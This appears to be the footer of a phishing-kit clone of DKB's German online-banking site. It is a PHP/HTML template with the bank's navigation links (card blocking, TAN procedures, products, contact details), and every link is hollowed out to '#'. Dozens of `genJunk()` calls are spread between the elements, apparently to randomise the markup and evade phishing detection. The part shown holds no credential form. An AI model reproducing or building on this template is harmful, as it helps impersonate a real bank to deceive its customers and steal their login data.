						<?php echo genJunk() ?><div class="clearfix module textDefaultModuleMarginal">
							<h4><span>Weitere Informationen</span></h4>
							<?php echo genJunk() ?><div class="text">
								<p>
									<ul class="clearfix linkList">
										<li><a href="#" target="_self"><span class="icons arrowNext"></span>Karte sperren</a></li>
										<li><a href="#" target="_self"><span class="icons arrowNext"></span>Sicherheitshinweise</a></li>
										<li><a href="#" target="_self"><span class="icons arrowNext"></span>TAN-Verfahren</a></li>
									</ul>
								</p>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
                
				<?php echo genJunk() ?><div class="clearfix richfooter_wrap" id="richfooter_wrap">
					<?php echo genJunk() ?><div class="richfooter mobileAccordion">
						  <script type="text/javascript">
							  jQuery(document).ready(function() {
								jQuery('.anmelden').each(function() {
								  if(document.location.protocol == "http:") {
									var originalUrl = jQuery(this).attr('href');
									var targetUrl = "https://" + document.location.hostname + originalUrl;
									jQuery(this).attr('href', targetUrl);
								  }
								});
							  });
							</script>
						  <?php echo genJunk() ?><div class="footer_col">
							  <h4 >DKB AG<span class="trigger_icon"></span></h4>
							  <ul>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Jobs',sendOnUnload:1});" name="RF Jobs"><span class='icons arrowNext'></span>Jobs</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Presse',sendOnUnload:1});" name="RF Presse"><span class='icons arrowNext'></span>Presse</a></li>
									  <li><a href="#" class="modal {content:{player: 'ajax'}}" onclick="wt.sendinfo({linkId:'RF Investor Relations' sendOnUnload:1});"name="RF Investor Relations">Investor Relations</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Vertriebspartner',sendOnUnload:1});" name="RF Vertriebspartner"><span class='icons arrowNext'></span>Vertriebspartner</a></li>
								  </ul>
							</div><?php echo genJunk() ?>
				
						  <?php echo genJunk() ?><div class="footer_col">
							  <h4 >Beliebte Produkte<span class="trigger_icon"></span></h4>
							  <ul>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Girokonto',sendOnUnload:1});" name="RF Girokonto"><span class='icons arrowNext'></span>Girokonto</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Online-Depot',sendOnUnload:1});" name="RF Online-Depot"><span class='icons arrowNext'></span>Kreditkarte</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Online-Depot',sendOnUnload:1});" name="RF Online-Depot"><span class='icons arrowNext'></span>Online-Depot</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Privatkredit',sendOnUnload:1});" name="RF Privatkredit"><span class='icons arrowNext'></span>Privatkredit</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Studienkredit',sendOnUnload:1});" name="RF Studienkredit"><span class='icons arrowNext'></span>Studienkredit</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Geschäftskonto',sendOnUnload:1});" name="RF Geschäftskonto"><span class='icons arrowNext'></span>Geschäftskonto</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Immobilienangebote',sendOnUnload:1});" name="RF Immobilienangebote"><span class='icons arrowNext'></span>Immobilienangebote</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Baufinanzierung',sendOnUnload:1});" name="RF Baufinanzierung"><span class='icons arrowNext'></span>Baufinanzierung</a></li>
								  </ul>
							</div><?php echo genJunk() ?>
				
						 <?php echo genJunk() ?><div class="footer_col">
							  <h4 >Banking & Apps<span class="trigger_icon"></span></h4>
							  <ul>
									  <li>    
							<a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Internet-Banking',sendOnUnload:1});">
							  <span class='icons arrowNext'></span>Internet-Banking
							</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Banking-App',sendOnUnload:1});"><span class='icons arrowNext'></span>Banking-App</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF pushTAN-App',sendOnUnload:1});"><span class='icons arrowNext'></span>pushTAN-App</a></li>
									  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF DKB-Card-Secure-App',sendOnUnload:1});"><span class='icons arrowNext'></span>Card-Secure App</a></li>
									  <li>    

							<span class='icons arrowNext'></span>
							<a href="#"      target="_blank"     class="suggestLink " 
								name="RF Verwalterplattform"          onclick="wt.sendinfo({linkId:'RF Verwalterplattform',sendOnUnload:1});"
								>
							  Verwalterplattform
							</a></li>
									  <li>    

							<span class='icons arrowNext'></span>
							<a href="#"      target="_blank"     class="suggestLink " 
								name="RF Treuhänderplattform"          onclick="wt.sendinfo({linkId:'RF Treuhänderplattform',sendOnUnload:1});"
								>
							  Treuhänderplattform
							</a></li>
								  </ul>
						</div><?php echo genJunk() ?>
						 <?php echo genJunk() ?><div class="footer_col">
							<h4 >Sicherheit<span class="trigger_icon"></span></h4>
							<ul>
								  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Sicherheitsgarantie',sendOnUnload:1});"><span class='icons arrowNext'></span>Sicherheitsgarantie</a></li>
								  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Sicherheit im Überblick',sendOnUnload:1});"><span class='icons arrowNext'></span>Sicherheit im Überblick</a></li>
								  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF TAN-Verfahren',sendOnUnload:1});"><span class='icons arrowNext'></span>TAN-Verfahren</a></li>
								  <li></li>
								  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Karte sperren',sendOnUnload:1});" name="RF Karte sperren"><span class='icons arrowNext'></span>Karte sperren</a></li>
								  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Einlagensicherung',sendOnUnload:1});" name="RF Einlagensicherung"><span class='icons arrowNext'></span>Einlagensicherung</a></li>
						  </ul>
						</div><?php echo genJunk() ?>
				
						<?php echo genJunk() ?><div class="footer_col">
						  <h4 class="initopen">Kontakt & Service<span class="trigger_icon"></span></h4>
								<ul>
								  <li><p><span class="tel_icon" name="RF anrufen">030 120 300 00</span></p></li>
								  <li>    
									<a href="#" class="suggestLink mail_icon" onclick="wt.sendinfo({linkId:'RF Nachricht schreiben',sendOnUnload:1});">
									  <span class='icons arrowNext'></span>Nachricht schreiben
									</a>
								</li>
								  <li></li>
								  <li>    

										<span class='icons arrowNext'></span>
										<a href="#"      target="_blank"     class="suggestLink fb_icon" onclick="wt.sendinfo({linkId:'RF Facebook',sendOnUnload:1});">
										  Facebook
										</a>
								</li>
								  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Fragen & Antworten',sendOnUnload:1});" name="RF Fragen & Antworten"><span class='icons arrowNext'></span>Fragen & Antworten</a></li>
								  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Formulare?',sendOnUnload:1});" name="RF Formulare?"><span class='icons arrowNext'></span>Formulare</a></li>
								  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Schon gewusst?',sendOnUnload:1});" name="RF Schon gewusst?"><span class='icons arrowNext'></span>Schon gewusst?</a></li>
								  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Erklärvideos',sendOnUnload:1});" name="RF Erklärvideos"><span class='icons arrowNext'></span>Erklärvideos</a></li>
								  <li>    
									<a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF Geldautomaten suchen',sendOnUnload:1});" name="RF Geldautomaten suchen">
									  <span class='icons arrowNext'></span>Geldautomaten suchen
									</a>
									</li>
								  <li>            <a href="#" class="suggestLink " onclick="wt.sendinfo({linkId:'RF IBAN-Rechner',sendOnUnload:1});" name="RF IBAN-Rechner"><span class='icons arrowNext'></span>IBAN-Rechner</a></li>
							  </ul>
						</div><?php echo genJunk() ?>
				
						<?php echo genJunk() ?><div class="footer_col footer_special">
							<a href="#" name="Deutsche Kreditbank AG"><?php echo genJunk() ?><div class="dkb_ag_logo_container"></div><?php echo genJunk() ?></a>
						</div><?php echo genJunk() ?>
				  </div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>
        </div><?php echo genJunk() ?>
        
		<?php echo genJunk() ?><div class="outerfooter" id="outerfooter">
			<ul>
				<li><a href="#">Impressum</a></li>
				<li><a href="#">Datenschutz</a></li>
				<li><a href="#">Preise &amp; Bedingungen</a></li>
				<li>BIC: BYLADEM1001</li>
				<li class="forceDesktopLink hide_for_app"><a href="#" onclick="forceViewportDesktop(true)" title="zur Desktop Ansicht">zur Desktop Ansicht</a></li>
				<li class="unForceDesktopLink hide_for_app"><a href="#" onclick="forceViewportDesktop(false)" title="zur mobilen Ansicht">zur mobilen Ansicht</a></li>
			</ul>
		</div><?php echo genJunk() ?>
		
	</body>
</html>